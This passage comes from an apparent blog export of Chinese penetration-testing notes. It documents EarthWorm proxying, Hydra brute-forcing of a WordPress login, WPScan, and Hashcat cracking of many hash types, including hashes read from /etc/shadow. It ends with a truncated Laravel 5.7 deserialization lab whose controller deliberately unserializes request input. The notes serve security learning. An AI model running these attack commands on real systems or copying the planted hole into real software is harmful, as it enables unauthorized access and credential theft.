href="https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA">https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA</a></p>]]></content>
      
      
      <categories>
          
          <category> JWT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EarthWorm</title>
      <link href="/2023/01/28/penetrationstest/gong-ju-shi-yong/duan-kou-zhuan-fa/earthworm/"/>
      <url>/2023/01/28/penetrationstest/gong-ju-shi-yong/duan-kou-zhuan-fa/earthworm/</url>
      
        <content type="html"><![CDATA[<h1 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h1><h2 id="0、软件介绍"><a href="#0、软件介绍" class="headerlink" title="0、软件介绍"></a>0、软件介绍</h2><p>EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 专有主页： <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><h2 id="1、参数说明"><a href="#1、参数说明" class="headerlink" title="1、参数说明"></a>1、参数说明</h2><pre class="line-numbers language-none"><code class="language-none">-l listenport  open a port for the service startup.        // 为服务启动打开一个端口。-d refhost set the reflection host address.                // 设置反连主机地址。-e refport set the reflection port.                        // 设置反连端口。-f connhost set the connect host address .                 // 设置连接主机地址。-g connport set the connect port.                          // 设置连接端口。-t usectime set the milliseconds for timeout.              // 设置超时的毫秒数。默认值值为1000-s state setup the function.                               // 状态设置功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>六种链路状态，通过 -s 参数选定，分别为:</p><pre class="line-numbers language-none"><code class="language-none">ssocksd rcsocks rssockslcx_slave lcx_tran lcx_listen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。</p><p>lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。</p><p>lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</p><p>lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。</p><p>lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</p><p>通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> 端口转发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hydra 九头蛇</title>
      <link href="/2023/01/28/penetrationstest/gong-ju-shi-yong/bao-li-po-jie/hydra-jiu-tou-she/"/>
      <url>/2023/01/28/penetrationstest/gong-ju-shi-yong/bao-li-po-jie/hydra-jiu-tou-she/</url>
      
        <content type="html"><![CDATA[<h1 id="Hydra-九头蛇"><a href="#Hydra-九头蛇" class="headerlink" title="Hydra 九头蛇"></a>Hydra 九头蛇</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>hydra 是一款开源的暴力密码破解工具，支持多种协议密码的破解。</p><h2 id="2-获取-amp-安装"><a href="#2-获取-amp-安装" class="headerlink" title="2. 获取&amp;安装"></a>2. 获取&amp;安装</h2><p>kali 中自带该工具</p><h2 id="3-常用命令"><a href="#3-常用命令" class="headerlink" title="3. 常用命令"></a>3. 常用命令</h2><ul><li><p>-R 还原以前中止或崩溃的会话</p></li><li><p>-S 使用SSL连接</p></li><li><p>-s 指定非默认端口</p></li><li><p>-l 使用登录名进行登录</p></li><li><p>-L 使用账号字典进行破解</p></li><li><p>-p 使用密码进行登录</p></li><li><p>-P 使用密码字典进行破解</p></li><li><p>-e nsr n:空密码破解 s：使用的user作为密码破解 r：反向登录</p></li><li><p>-C 指定所用格式为”user:password”字典文件</p></li><li><p>-M 指定破解的目标文件，如果不是默认端口，后面跟上”: port”</p></li><li><p>-o 将破解成功的用户名：密码写入指定文件</p></li><li><p>-b 指定文件类型(txt (default)，json，jsonv1)</p></li><li><p>-f / -F 在找到用户名或密码时退出( -f 每个主机 -F 主机文件)</p></li><li><p>-t 设置每个目标并行连接数(默认为16)</p></li><li><p>-T 任务总体的并行连接数（默认为64）</p></li><li><p>-w /-W 设置超时时间(默认为32秒) 每个线程之间连接等待时间(默认为0)</p></li><li><p>-v / -V / -d 详细模式 / 显示login+pass 每个尝试 / 调试模式</p></li><li><p>-O 使用老版本SSL V2和V3</p></li><li><p>-q 不输出连接错误信息</p></li><li><p>-U 查看 支持破解的服务和协议</p></li><li><p>server 目标ip、某个网段</p></li></ul><p>service 指定服务/协议名称</p><p>OPT 某些模块支持附加输入</p><h2 id="4-使用到的一些命令"><a href="#4-使用到的一些命令" class="headerlink" title="4. 使用到的一些命令"></a>4. 使用到的一些命令</h2><h3 id="4-1-破解-WP-登录"><a href="#4-1-破解-WP-登录" class="headerlink" title="4.1 破解 WP 登录"></a>4.1 破解 WP 登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-P</span> /tmp/pw.txt <span class="token parameter variable">-vV</span> <span class="token number">192.168</span>.0.101 http-post-form <span class="token string">"/weblog/wp-login.php:log=^USER^&amp;pwd=^PASS^:error"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>http-port-form - 破解 post 表单</li><li>/weblog/wp-login.php - 目录地址</li><li>log=^USER^&amp;pwd=^PASS^ - 表单内容</li><li>error - 登录错误返回的关键字</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordPress 漏洞扫描</title>
      <link href="/2023/01/28/penetrationstest/gong-ju-shi-yong/lou-dong-sao-miao/wordpress-lou-dong-sao-miao/"/>
      <url>/2023/01/28/penetrationstest/gong-ju-shi-yong/lou-dong-sao-miao/wordpress-lou-dong-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress-漏洞扫描"><a href="#WordPress-漏洞扫描" class="headerlink" title="WordPress 漏洞扫描"></a>WordPress 漏洞扫描</h1><h2 id="1-WPScan-简介"><a href="#1-WPScan-简介" class="headerlink" title="1. WPScan 简介"></a>1. WPScan 简介</h2><p>WordPress网站介绍</p><ul><li>WordPress是全球流行的博客网站，全球有上百万人使用它来搭建博客。他使用PHP脚本和Mysql数据库来搭建网站。</li><li>Wordpress作为三大建站模板之一，在全世界范围内有大量的用户，这也导致白帽子都会去跟踪 WordPress的安全漏洞，Wordpress自诞生起也出现了很多漏洞。Wordpress还可以使用插件、主题。于是Wordpress本身很难挖掘什么安全问题的时候，安全研究者开始研究其插件、主题的漏洞。通过插件，主题的漏洞去渗透Wordpress站点，于是WPScan应运而生，收集 Wordpress的各种漏洞，形成一个Wordpress专用扫描器</li><li>WPScan是一个扫描 WordPress 漏洞的黑盒子扫描器，它可以为所有 Web 开发人员扫描 WordPress 漏洞并在他们开发前找到并解决问题。我们还使用了 Nikto ，它是一款非常棒的Web 服务器评估工具，我们认为这个工具应该成为所有针对 WordPress网站进行的渗透测试的一部分</li><li>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能</li><li>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。</li></ul><p>WPScan已经被预安装在以下Linux系统中</p><ul><li>BackBox Linux</li><li>Kali Linux</li><li>Pentoo</li><li>SamuraiWTF</li><li>BlackArch</li></ul><h2 id="2-WPScan-参数"><a href="#2-WPScan-参数" class="headerlink" title="2. WPScan 参数"></a>2. WPScan 参数</h2><p>使用wpscan -h可以查看各种参数以及定义</p><p>![[../../../../pic/Pasted image 20220822093542.png|L]]</p><p>常用选项</p><ul><li>–update 更新到最新版本</li><li>–url | -u &lt;target url&gt; 要扫描的 <code>WordPress</code> 站点.</li><li>–force | -f 不检查网站运行的是不是 <code>WordPress</code></li><li>–enumerate | -e [option(s)] 枚举</li></ul><h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3. 漏洞扫描"></a>3. 漏洞扫描</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> <span class="token string">"xxx"</span> --api-token <span class="token string">"xxx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>token 需要到 <a href="https://wpscan.com/profile">https://wpscan.com/profile</a> 注册过后进行获取</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashCat 哈希破解</title>
      <link href="/2023/01/28/penetrationstest/gong-ju-shi-yong/bao-li-po-jie/hashcat-ha-xi-po-jie/"/>
      <url>/2023/01/28/penetrationstest/gong-ju-shi-yong/bao-li-po-jie/hashcat-ha-xi-po-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="HashCat-哈希破解"><a href="#HashCat-哈希破解" class="headerlink" title="HashCat 哈希破解"></a>HashCat 哈希破解</h1><h2 id="1-HashCat-简介"><a href="#1-HashCat-简介" class="headerlink" title="1. HashCat 简介"></a>1. HashCat 简介</h2><p>HashCat系列软件在硬件上支持使用CPU、NVIDIA GPU、ATI GPU来进行密码破解。在操作系统上支持Windows、Linux平台，并且需要安装官方指定版本的显卡驱动程序，如果驱动程序版本不对，可能导致程序无法运行。</p><p>HashCat主要分为三个版本：Hashcat、oclHashcat-plus、oclHashcat-lite。这三个版本的主要区别是：HashCat只支持CPU破解。oclHashcat-plus支持使用GPU破解多个HASH，并且支持的算法高达77种。oclHashcat-lite只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，但是对算法进行了优化，可以达到GPU破解的最高速度。如果只有单个密文进行破解的话，推荐使用oclHashCat-lite。</p><h2 id="2-常用参数"><a href="#2-常用参数" class="headerlink" title="2. 常用参数"></a>2. 常用参数</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">-r  使用自定义破解规则-o  指定破解成功后的 hash 及所对应的明文密码的存放位置-m  指定要破解的 hash 类型，如果不指定类型，则默认是 MD5-a  指定要使用的破解模式，其值参考后面对参数。“-a 0” 字典攻击，“-a 1” 组合攻击；“-a 3” 掩码攻击-D  指定 opencl 的设备类型--show      显示已经破解的 hash 及该 hash 所对应的明文--force     忽略破解过程中的警告信息,跑单条 hash 可能需要加上此选项--remove    删除已被破解成功的 hash--username      忽略 hash 文件中的指定的用户名,在破解 linux 系统用户密码 hash 可能会用到--increment     启用增量破解模式,你可以利用此模式让 hashcat 在指定的密码长度范围内执行破解过程--increment-min         密码最小长度,后面直接等于一个整数即可,配置 increment 模式一起使用--increment-max         密码最大长度,同上--outfile-format        指定破解结果的输出格式 id ,默认是 3--self-test-disable 关闭启动自检<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>-a 参数</li></ul><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">0 | Straight        （字段破解）1 | Combination （组合破解）3 | Brute-force （掩码暴力破解）6 | Hybrid Wordlist + Mask（字典+掩码破解）7 | Hybrid Mask + Wordlist（掩码+字典破解）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>-D 指定设备类型</li></ul><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">1 | CPU2 | GPU3 | FPGA, DSP, Co-Processor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一般使用 -D 2 指定 GPU 破解</p><ul><li>掩码设置</li></ul><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">l | abcdefghijklmnopqrstuvwxyz              纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ              纯大写字母d | 0123456789                                              纯数字h | 0123456789abcdef                                    十六进制小写字母和数字H | 0123456789ABCDEF                                    十六进制大写字母和数字s |  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~   特殊字符a | ?l?u?d?s                                                    键盘上所有可见的字符b | 0x00 - 0xff                                             匹配密码空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>掩码设置举例：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">八位数字密码：?d?d?d?d?d?d?d?d八位未知密码：?a?a?a?a?a?a?a?a前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自定义掩码规则：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">--custom-charset1 [chars]等价于 -1--custom-charset2 [chars]等价于 -2--custom-charset3 [chars]等价于 -3--custom-charset4 [chars]等价于 -4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在掩码中用 ?1、?2、?3、?4 来表示</p><p>注意：</p><p>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</p><p>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</p><p>另外 Hash 模式与 ID 的对照表由于太长，这里就不放了，可以直接 hashcat -h 进行查看</p><h2 id="3-使用示例"><a href="#3-使用示例" class="headerlink" title="3. 使用示例"></a>3. 使用示例</h2><h3 id="3-1-破解-MD5"><a href="#3-1-破解-MD5" class="headerlink" title="3.1 破解 MD5"></a>3.1 破解 MD5</h3><p>使用掩码破解八位数字</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">0</span> <span class="token parameter variable">-a</span> <span class="token number">3</span> e1eb0d083ab1a50d9c2b9e34a30f26bb ?d?d?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用掩码破解八位字母加数字</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">0</span> <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-1</span> ?l?d 03b291644856a7ccd3c4cb42e4a085a1 ?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用指定字符集破解</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">0</span> <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-1</span> 123456abcdf 85cf5b86052da3f5a886864ac0b8fc5d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> 19b9a36f0cab6d89cd4d3c21b2aa15be <span class="token parameter variable">--increment</span> --increment-min <span class="token number">1</span> --increment-max <span class="token number">8</span> ?a?a?a?a?a?a?a?a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-破解-Mysql4-1-x2F-5"><a href="#3-2-破解-Mysql4-1-x2F-5" class="headerlink" title="3.2 破解 Mysql4.1/5"></a>3.2 破解 Mysql4.1/5</h3><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值。</p></blockquote><h3 id="3-3-破解-sha512crypt-6-SHA512-Unix"><a href="#3-3-破解-sha512crypt-6-SHA512-Unix" class="headerlink" title="3.3 破解 sha512crypt $6$, SHA512 (Unix)"></a>3.3 破解 sha512crypt $6$, SHA512 (Unix)</h3><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-m</span> <span class="token number">1800</span> <span class="token parameter variable">--force</span> <span class="token string">'$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew/xd0O0hPG/yrm2X.'</span> ?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可通过 cat /etc/shadow 获取哈希值</p><p>或者不删除用户名，直接使用 –username 参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-m</span> <span class="token number">1800</span> <span class="token parameter variable">--force</span> <span class="token string">'qiyou:$6$QDq75ki3$jsKm7qTDHz/xBob0kF1Lp170Cgg0i5Tslf3JW/sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1'</span> ?l?l?l?l?l <span class="token parameter variable">--username</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-4-破解-NTLM"><a href="#3-4-破解-NTLM" class="headerlink" title="3.4 破解 NTLM"></a>3.4 破解 NTLM</h3><p>NT Hash</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-m</span> <span class="token number">1000</span> 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LM Hash</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-m</span> <span class="token number">3000</span> F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NetNTLM Hash</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-m</span> <span class="token number">5500</span> teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 <span class="token parameter variable">-1</span> ?l?u ?1?1?1?1?d?d?d?d  <span class="token parameter variable">--force</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-5-破解-MSSQL-2005"><a href="#3-5-破解-MSSQL-2005" class="headerlink" title="3.5 破解 MSSQL (2005)"></a>3.5 破解 MSSQL (2005)</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-m</span> <span class="token number">132</span> <span class="token parameter variable">--force</span> 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-6-WordPress-密码-hash"><a href="#3-6-WordPress-密码-hash" class="headerlink" title="3.6 WordPress 密码 hash"></a>3.6 WordPress 密码 hash</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-m</span> <span class="token number">400</span> <span class="token parameter variable">--force</span> <span class="token string">'$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY/'</span> ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p><h3 id="3-7-Discuz-用户密码-hash"><a href="#3-7-Discuz-用户密码-hash" class="headerlink" title="3.7 Discuz 用户密码 hash"></a>3.7 Discuz 用户密码 hash</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">3</span> <span class="token parameter variable">-m</span> <span class="token number">2611</span> <span class="token parameter variable">--force</span> 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>其密码加密方式 md5(md5($pass).$salt)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel 5.7 反序列化漏洞</title>
      <link href="/2023/01/28/penetrationstest/lou-dong-fu-xian/laravel/laravel-5.7-fan-xu-lie-hua-lou-dong/"/>
      <url>/2023/01/28/penetrationstest/lou-dong-fu-xian/laravel/laravel-5.7-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Laravel-5-7-反序列化漏洞"><a href="#Laravel-5-7-反序列化漏洞" class="headerlink" title="Laravel 5.7 反序列化漏洞"></a>Laravel 5.7 反序列化漏洞</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Laravel v5.7是一款基于php 7.1.3之上运行的优秀php开发框架，5.7.x版本中的Illuminate组件存在反序列化漏洞。</p><p>CVE编号是CVE-2019-9081</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>从 github 上下载下来源文件</p><p><a href="https://github.com/laravel/laravel/tree/5.7">https://github.com/laravel/laravel/tree/5.7</a></p><p>进入文件夹中执行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">composer</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>完整安装后加一个触发点</p><p>在 routes/web.php 中加入一个路由</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/test'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\App\Http\Controllers\TestController@test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 app/Http/Controllers/ 下新建一个控制器</p><p>TestController.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Routing<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TestController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Welcome to laravel5.7"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="500-问题解决"><a href="#500-问题解决" class="headerlink" title="500 问题解决"></a>500 问题解决</h3><p>在 config/app.php 中打开调试模式</p><p><img src="/../../../../pic/Pasted%20image%2020221116152107.png"></p><p>再次访问网页</p><p><img src="/../../../../pic/Pasted%20image%2020221116152142.png"></p><p>提示没有加密秘钥</p><p><img src="/../../../../pic/Pasted%20image%2020221116152207.png"></p><p>将根目录下的 .env.example 复制一份</p><p>然后再根目录下运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php artisan key:generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次刷新页面即可</p><p>参考链接：<a href="https://blog.csdn.net/zhunju0089/article/details/103451116">https://blog.csdn.net/zhunju0089/article/details/103451116</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和 laravel5.6 相比，laravel5.7 多了 PendingCommand.php 这个文件</p><p>该类的作用是命令执行，并获取输出内容。</p><p><code>laravel\vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php</code></p><p>看一下这个新增的类，发现有一个__destruct()。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Handle the object's destruction. * * @return void */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hasExecuted</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用了 run 函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**    * Execute the command.    *    * @return int    */</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>       <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hasExecuted</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">mockConsoleOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">try</span> <span class="token punctuation">{</span>           <span class="token variable">$exitCode</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token punctuation">[</span><span class="token class-name static-context">Kernel</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">parameters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoMatchingExpectationException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'askQuestion'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token operator">-&gt;</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected question "'</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getActualArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span 